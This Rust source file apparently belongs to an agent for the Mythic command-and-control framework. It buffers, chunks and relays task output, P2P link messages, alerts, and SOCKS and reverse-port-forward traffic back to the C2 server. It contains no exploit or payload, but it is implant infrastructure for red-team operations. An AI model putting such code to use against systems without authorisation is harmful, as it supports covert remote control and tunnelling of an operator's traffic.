use crate::structs::{
    Alert, DelegateMessage, InteractiveTaskMessage, MythicMessage, P2PConnectionMessage, Response,
    SocksMsg,
};
use std::sync::Mutex;
use std::time::Instant;
use tokio::sync::mpsc;

pub const USER_OUTPUT_CHUNK_SIZE: usize = 512_000;

lazy_static::lazy_static! {
    /// Timestamp of last real message from Mythic (for backoff logic)
    pub static ref LAST_MESSAGE_TIME: Mutex<Instant> = Mutex::new(Instant::now());
    /// Global buffer for poll-based profiles (HTTP). Responses accumulate here
    /// between poll cycles and get drained into each outgoing get_tasking POST.
    static ref POLL_BUFFER: Mutex<ResponseBuffer> = Mutex::new(ResponseBuffer::new());
}

pub fn update_last_message_time() {
    if let Ok(mut t) = LAST_MESSAGE_TIME.lock() {
        *t = Instant::now();
    }
}

pub fn get_last_message_time() -> Instant {
    LAST_MESSAGE_TIME.lock().map(|t| *t).unwrap_or_else(|_| Instant::now())
}

/// Calculate chunk count for a given data size
pub fn get_chunk_nums(size: usize) -> usize {
    std::cmp::max(1, (size + USER_OUTPUT_CHUNK_SIZE - 1) / USER_OUTPUT_CHUNK_SIZE)
}

/// All channels used by the response aggregation system
pub struct ResponseChannels {
    // Outbound channels (tasks send TO these)
    pub new_response_tx: mpsc::Sender<Response>,
    pub new_delegate_to_mythic_tx: mpsc::Sender<DelegateMessage>,
    pub p2p_connection_message_tx: mpsc::Sender<P2PConnectionMessage>,
    pub new_interactive_task_output_tx: mpsc::Sender<InteractiveTaskMessage>,
    pub new_alert_tx: mpsc::Sender<Alert>,
    pub to_mythic_socks_tx: mpsc::Sender<SocksMsg>,
    pub to_mythic_rpfwd_tx: mpsc::Sender<SocksMsg>,

    // Inbound channels (from Mythic, routed to tasks)
    pub from_mythic_socks_tx: mpsc::Sender<SocksMsg>,
    pub from_mythic_rpfwd_tx: mpsc::Sender<SocksMsg>,

    // Inbound channel for messages from egress/P2P
    pub handle_inbound_mythic_message_tx: mpsc::Sender<crate::structs::MythicMessageResponse>,
}

/// Buffered responses waiting to be sent to Mythic
pub struct ResponseBuffer {
    responses: Vec<Response>,
    delegates: Vec<DelegateMessage>,
    edges: Vec<P2PConnectionMessage>,
    interactive_tasks: Vec<InteractiveTaskMessage>,
    alerts: Vec<Alert>,
    socks: Vec<SocksMsg>,
    rpfwds: Vec<SocksMsg>,
}

impl ResponseBuffer {
    fn new() -> Self {
        Self {
            responses: Vec::new(),
            delegates: Vec::new(),
            edges: Vec::new(),
            interactive_tasks: Vec::new(),
            alerts: Vec::new(),
            socks: Vec::new(),
            rpfwds: Vec::new(),
        }
    }

    fn is_empty(&self) -> bool {
        self.responses.is_empty()
            && self.delegates.is_empty()
            && self.edges.is_empty()
            && self.interactive_tasks.is_empty()
            && self.alerts.is_empty()
            && self.socks.is_empty()
            && self.rpfwds.is_empty()
    }
}

/// Initialize the response aggregation system
pub fn initialize(
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) -> ResponseChannels {
    let (response_tx, response_rx) = mpsc::channel::<Response>(100);
    let (delegate_tx, delegate_rx) = mpsc::channel::<DelegateMessage>(100);
    let (p2p_msg_tx, p2p_msg_rx) = mpsc::channel::<P2PConnectionMessage>(100);
    let (interactive_tx, interactive_rx) = mpsc::channel::<InteractiveTaskMessage>(100);
    let (alert_tx, alert_rx) = mpsc::channel::<Alert>(100);
    let (socks_out_tx, socks_out_rx) = mpsc::channel::<SocksMsg>(10000);
    let (rpfwd_out_tx, rpfwd_out_rx) = mpsc::channel::<SocksMsg>(10000);
    let (socks_in_tx, _socks_in_rx) = mpsc::channel::<SocksMsg>(10000);
    let (rpfwd_in_tx, _rpfwd_in_rx) = mpsc::channel::<SocksMsg>(10000);
    let (inbound_tx, _inbound_rx) =
        mpsc::channel::<crate::structs::MythicMessageResponse>(10);

    // Spawn aggregator listeners
    tokio::spawn(listen_for_delegate_messages_to_mythic(
        delegate_rx,
        get_push_channel,
    ));
    tokio::spawn(listen_for_edge_announcements_to_mythic(
        p2p_msg_rx,
        get_push_channel,
    ));
    tokio::spawn(listen_for_interactive_tasks_to_mythic(
        interactive_rx,
        get_push_channel,
    ));
    tokio::spawn(listen_for_alert_messages_to_mythic(
        alert_rx,
        get_push_channel,
    ));
    tokio::spawn(listen_for_task_responses_to_mythic(
        response_rx,
        get_push_channel,
    ));
    tokio::spawn(listen_for_socks_traffic_to_mythic(
        socks_out_rx,
        get_push_channel,
    ));
    tokio::spawn(listen_for_rpfwd_traffic_to_mythic(
        rpfwd_out_rx,
        get_push_channel,
    ));

    ResponseChannels {
        new_response_tx: response_tx,
        new_delegate_to_mythic_tx: delegate_tx,
        p2p_connection_message_tx: p2p_msg_tx,
        new_interactive_task_output_tx: interactive_tx,
        new_alert_tx: alert_tx,
        to_mythic_socks_tx: socks_out_tx,
        to_mythic_rpfwd_tx: rpfwd_out_tx,
        from_mythic_socks_tx: socks_in_tx,
        from_mythic_rpfwd_tx: rpfwd_in_tx,
        handle_inbound_mythic_message_tx: inbound_tx,
    }
}

/// Drain the global poll buffer and return a MythicMessage with all pending data.
/// Called by poll-based profiles (HTTP) each iteration of their polling loop.
pub fn drain_poll_buffer() -> MythicMessage {
    let mut buf = POLL_BUFFER.lock().unwrap();
    create_mythic_poll_message(&mut buf)
}

/// Store a MythicMessage's contents into the global poll buffer.
/// Used by response listeners when no push channel is available.
fn buffer_message(msg: MythicMessage) {
    let mut buf = POLL_BUFFER.lock().unwrap();
    if let Some(responses) = msg.responses {
        buf.responses.extend(responses);
    }
    if let Some(delegates) = msg.delegates {
        buf.delegates.extend(delegates);
    }
    if let Some(edges) = msg.edges {
        buf.edges.extend(edges);
    }
    if let Some(interactive) = msg.interactive_tasks {
        buf.interactive_tasks.extend(interactive);
    }
    if let Some(alerts) = msg.alerts {
        buf.alerts.extend(alerts);
    }
    if let Some(socks) = msg.socks {
        buf.socks.extend(socks);
    }
    if let Some(rpfwds) = msg.rpfwds {
        buf.rpfwds.extend(rpfwds);
    }
}

/// Create a MythicMessage for polling, draining all buffered data
fn create_mythic_poll_message(buffer: &mut ResponseBuffer) -> MythicMessage {
    let mut msg = MythicMessage::new_get_tasking();

    if !buffer.responses.is_empty() {
        // Handle chunking for large responses
        let mut chunked_responses = Vec::new();
        for response in buffer.responses.drain(..) {
            if response.user_output.len() > USER_OUTPUT_CHUNK_SIZE {
                // Split into chunks
                let chunks = get_chunk_nums(response.user_output.len());
                let bytes = response.user_output.as_bytes();
                for i in 0..chunks {
                    let start = i * USER_OUTPUT_CHUNK_SIZE;
                    let end = std::cmp::min((i + 1) * USER_OUTPUT_CHUNK_SIZE, bytes.len());
                    let chunk = String::from_utf8_lossy(&bytes[start..end]).to_string();
                    let mut chunk_response = response.clone();
                    chunk_response.user_output = chunk;
                    // Only mark completed on last chunk
                    if i < chunks - 1 {
                        chunk_response.completed = false;
                    }
                    chunked_responses.push(chunk_response);
                }
            } else {
                chunked_responses.push(response);
            }
        }
        msg.responses = Some(chunked_responses);
    }

    if !buffer.delegates.is_empty() {
        msg.delegates = Some(buffer.delegates.drain(..).collect());
    }

    if !buffer.edges.is_empty() {
        msg.edges = Some(buffer.edges.drain(..).collect());
    }

    if !buffer.interactive_tasks.is_empty() {
        msg.interactive_tasks = Some(buffer.interactive_tasks.drain(..).collect());
    }

    if !buffer.alerts.is_empty() {
        msg.alerts = Some(buffer.alerts.drain(..).collect());
    }

    if !buffer.socks.is_empty() {
        msg.socks = Some(buffer.socks.drain(..).collect());
    }

    if !buffer.rpfwds.is_empty() {
        msg.rpfwds = Some(buffer.rpfwds.drain(..).collect());
    }

    msg
}

// ============================================================================
// Response Aggregator Listeners
// ============================================================================

async fn try_push_or_buffer(
    msg: MythicMessage,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    if let Some(push_tx) = get_push_channel() {
        let _ = push_tx.send(msg).await;
    } else {
        // Poll-based profile (HTTP): buffer for next poll cycle
        buffer_message(msg);
    }
}

async fn listen_for_delegate_messages_to_mythic(
    mut rx: mpsc::Receiver<DelegateMessage>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(delegate) = rx.recv().await {
        let mut msg = MythicMessage::new_get_tasking();
        msg.delegates = Some(vec![delegate]);
        try_push_or_buffer(msg, get_push_channel).await;
    }
}

async fn listen_for_edge_announcements_to_mythic(
    mut rx: mpsc::Receiver<P2PConnectionMessage>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(edge) = rx.recv().await {
        let mut msg = MythicMessage::new_get_tasking();
        msg.edges = Some(vec![edge]);
        try_push_or_buffer(msg, get_push_channel).await;
    }
}

async fn listen_for_interactive_tasks_to_mythic(
    mut rx: mpsc::Receiver<InteractiveTaskMessage>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(interactive) = rx.recv().await {
        let mut msg = MythicMessage::new_get_tasking();
        msg.interactive_tasks = Some(vec![interactive]);
        try_push_or_buffer(msg, get_push_channel).await;
    }
}

async fn listen_for_alert_messages_to_mythic(
    mut rx: mpsc::Receiver<Alert>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(alert) = rx.recv().await {
        let mut msg = MythicMessage::new_get_tasking();
        msg.alerts = Some(vec![alert]);
        try_push_or_buffer(msg, get_push_channel).await;
    }
}

async fn listen_for_task_responses_to_mythic(
    mut rx: mpsc::Receiver<Response>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(response) = rx.recv().await {
        // Handle chunking for large responses
        if response.user_output.len() > USER_OUTPUT_CHUNK_SIZE {
            let chunks = get_chunk_nums(response.user_output.len());
            let bytes = response.user_output.as_bytes();
            for i in 0..chunks {
                let start = i * USER_OUTPUT_CHUNK_SIZE;
                let end = std::cmp::min((i + 1) * USER_OUTPUT_CHUNK_SIZE, bytes.len());
                let chunk = String::from_utf8_lossy(&bytes[start..end]).to_string();
                let mut chunk_response = response.clone();
                chunk_response.user_output = chunk;
                if i < chunks - 1 {
                    chunk_response.completed = false;
                }
                let mut msg = MythicMessage::new_get_tasking();
                msg.responses = Some(vec![chunk_response]);
                try_push_or_buffer(msg, get_push_channel).await;
            }
        } else {
            let mut msg = MythicMessage::new_get_tasking();
            msg.responses = Some(vec![response]);
            try_push_or_buffer(msg, get_push_channel).await;
        }
    }
}

async fn listen_for_socks_traffic_to_mythic(
    mut rx: mpsc::Receiver<SocksMsg>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(socks) = rx.recv().await {
        let mut msg = MythicMessage::new_get_tasking();
        msg.socks = Some(vec![socks]);
        try_push_or_buffer(msg, get_push_channel).await;
    }
}

async fn listen_for_rpfwd_traffic_to_mythic(
    mut rx: mpsc::Receiver<SocksMsg>,
    get_push_channel: fn() -> Option<mpsc::Sender<MythicMessage>>,
) {
    while let Some(rpfwd) = rx.recv().await {
        let mut msg = MythicMessage::new_get_tasking();
        msg.rpfwds = Some(vec![rpfwd]);
        try_push_or_buffer(msg, get_push_channel).await;
    }
}
